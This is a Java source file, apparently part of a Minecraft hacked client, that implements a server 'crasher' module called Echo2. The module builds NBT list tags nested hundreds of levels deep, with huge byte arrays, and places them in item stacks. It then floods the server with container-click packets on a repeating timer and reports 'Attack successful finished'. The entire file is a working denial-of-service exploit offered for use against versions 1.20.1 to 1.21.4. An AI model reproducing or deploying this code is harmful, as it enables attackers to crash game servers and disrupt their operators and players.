package us.whitedev.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import net.minecraft.nbt.ByteTag;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.protocol.RedSignalProtocol;
import us.whitedev.protocol.components.data.DataComponents;
import us.whitedev.protocol.components.data.impl.DataCustom;
import us.whitedev.protocol.packets.PacketCodec;
import us.whitedev.protocol.packets.play.PacketContainerClick;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.List;
import java.util.Optional;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class Echo2 implements Crasher {
    private static final String METHOD_NAME = "Echo2";
    private boolean enabled = false;
    private ScheduledExecutorService executorService;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int depth = Integer.parseInt(args[3]);
        int size = Integer.parseInt(args[4]);
        int threadSleep = Integer.parseInt(args[5]);
        long loopAmount = Long.parseLong(args[6]);

        setEnabled(true);

        if (executorService != null && !executorService.isShutdown()) {
            executorService.shutdownNow();
            msgHelper.sendMessage("Previous attack &cstopped&7!", true);
        }

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();

        if (protocol != 770) {
            msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.IS_VISIBLE ? getName() : "******"), true);

            CompoundTag tag = generateTag(size, depth);

            boolean isNewVersion = RedSignalProtocol.SUPPORTED_PROTOCOLS.contains(protocol);
            if (!isNewVersion)
                msgHelper.sendMessage("You are using native data structure, if you want to use new structure, change version to 1.20.5+", true);

            AtomicInteger check = new AtomicInteger(0);
            executorService = Executors.newSingleThreadScheduledExecutor();
            Runnable clickTask = () -> {
                if (!enabled || check.get() >= loopAmount || (mc.getConnection() == null || !mc.getConnection().getConnection().isConnected())) {
                    executorService.shutdown();
                    setEnabled(false);
                    msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
                    return;
                }
                sendCrashPackets(tag, packets, isNewVersion, protocol);
                check.getAndIncrement();
            };
            executorService.scheduleWithFixedDelay(clickTask, 0, threadSleep, TimeUnit.MILLISECONDS);
        }else{
            msgHelper.sendMessage("Crasher " + getName() + " is &cnot supported &7by 1.21.5", true);
        }
    }

    private void sendCrashPackets(CompoundTag tag, int packets, boolean isNewVersion, int protocol){
        if (isNewVersion) {
            DataCustom dataCustom = new DataCustom(tag);

            DataComponents dataComponents = new DataComponents();
            dataComponents.put(dataCustom);

            us.whitedev.protocol.components.objects.ItemStack stack = new us.whitedev.protocol.components.objects.ItemStack(1, 1, dataComponents);

            PacketCodec.sendPacket(new PacketContainerClick(protocol, 0, 1, 10,
                    PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.RIGHT_CLICK,
                    stack, new Int2ObjectArrayMap<>()), packets);
        } else {
            ItemStack stack = new ItemStack(Items.STONE, 1, Optional.of(tag));
            for (int i = 0; i < packets; i++)
                PacketHelper.send(new ServerboundContainerClickPacket(0, 1, 10, 0, ClickType.PICKUP, stack, new Int2ObjectArrayMap<>()));
        }
    }

    private CompoundTag generateTag(int size, int depth){
        CompoundTag tag = new CompoundTag();
        ListTag currentList;

        ListTag innermostList = new ListTag();
        for (int i = 0; i < size; i++)
            innermostList.add(new ByteTag((byte) 0));

        currentList = innermostList;
        for (int i = 0; i < depth; i++) {
            ListTag wrapper = new ListTag();
            wrapper.add(currentList);
            currentList = wrapper;
        }

        tag.put("", currentList);
        return tag;
    }

    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Power", OptionType.INTEGER),
                new OptionUtil("Depth", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER),
                new OptionUtil("Thread Sleep", OptionType.INTEGER),
                new OptionUtil("Loop Amount", OptionType.INTEGER)
        );
    }

    @Override
    public String getArgsUsage() {
        return "Packets[1000], Depth[511], Size[150000]";
    }

    @Override
    public String getDescription() {
        return "Massive NBT/Data 1.20.1/1.21.4 Crasher";
    }
}